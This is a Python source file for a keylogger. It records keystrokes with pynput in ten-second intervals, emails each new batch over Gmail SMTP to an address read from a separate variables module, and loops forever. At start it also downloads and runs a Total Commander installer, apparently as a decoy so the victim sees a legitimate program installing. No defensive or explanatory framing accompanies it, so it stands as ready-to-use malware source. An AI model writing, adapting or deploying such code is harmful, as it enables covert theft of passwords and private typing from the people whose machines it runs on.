import pynput.keyboard
import threading
import smtplib
import webbrowser
import requests
import os
import variables
import time
import subprocess

import variables

class Logger:
    def __init__(self, interval, email, password):
        self.log = ""
        self.interval = interval
        self.email = email
        self.password = password

    def append_log(self, string):
        self.log = self.log + string

    def log_keystroke(self, key):
        key = str(key).replace("'", "")

        if key == 'Key.space':
            key = ' '
        if key == 'Key.alt_l':
            key = ''
        if key == 'Key.shift':
            key = ''   
        if key == 'Key.ctrl_r':
            key = ''  
        if key == 'Key.ctrl_l':
            key = ''  
        if key == "Key.enter":
            key = '\n'
        self.append_log(key)

    def start(self):
        with pynput.keyboard.Listener(on_press=self.log_keystroke) as ls:
            def time_out(interval: int):
                time.sleep(interval)
                ls.stop()           
            threading.Thread(target=time_out, args=([self.interval])).start()
            ls.join() 

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email ,email, message)
        server.quit()
  

url = 'https://totalcommander.ch/win/fixed/tcmd951x64.exe'
r = requests.get(url)



with open('C:\\tcmd951x64.exe', 'wb') as f:
    f.write(r.content)

subprocess.call(["C:\\tcmd951x64.exe"])

checker = [0,]

while True:
    keylogger = Logger(10.0, variables.sender_email, variables.password)
    keylogger.start()
    size = len(keylogger.log)
    print(size)
    checker.append(size)
    print(checker)
    if checker[-1] > checker[-2]:
        keylogger.send_mail(keylogger.email, keylogger.password, "\n\n" + keylogger.log)
        print ("sended")
        checker.pop(0)
    if len(checker) > 1:
        checker.pop() 
    





